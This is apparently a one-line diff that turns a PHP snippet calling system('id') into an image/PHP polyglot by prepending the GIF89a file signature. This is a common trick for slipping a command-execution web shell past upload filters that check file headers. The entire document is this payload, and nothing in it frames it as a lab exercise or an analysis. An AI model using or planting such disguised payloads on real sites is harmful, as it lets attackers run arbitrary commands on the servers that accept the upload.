@@ -1,1 +1,1 @@
-<?php echo system('id'); ?>
+GIF89a;<?php echo system('id'); ?>
